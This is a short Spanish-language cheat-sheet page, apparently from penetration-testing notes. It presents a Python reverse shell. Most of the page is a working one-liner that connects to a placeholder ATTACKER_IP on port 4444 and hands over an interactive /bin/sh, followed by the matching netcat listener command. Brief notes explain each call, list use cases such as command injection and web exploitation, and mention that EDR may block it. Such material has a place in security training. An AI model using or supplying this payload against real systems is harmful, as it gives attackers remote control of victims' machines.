# Python Reverse Shell — Subprocess

## Descripción

Esta reverse shell utiliza el módulo **subprocess** para ejecutar una shell del sistema y redirigir la entrada y salida hacia una conexión de red.

---

# Comando

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

# Listener

```bash
nc -lvnp 4444
```

---

# Requisitos

* Python instalado
* shell disponible
* conexión saliente permitida

---

# Explicación

```
socket.socket()        → crea conexión TCP
connect()              → conecta al atacante
os.dup2()              → redirige flujos estándar
subprocess.call()      → ejecuta shell interactiva
```

---

# Cuándo usarlo

* command injection
* explotación web
* sistemas Linux con Python disponible

---

# Limitaciones

* puede ser bloqueado por EDR
* depende de la disponibilidad de Python
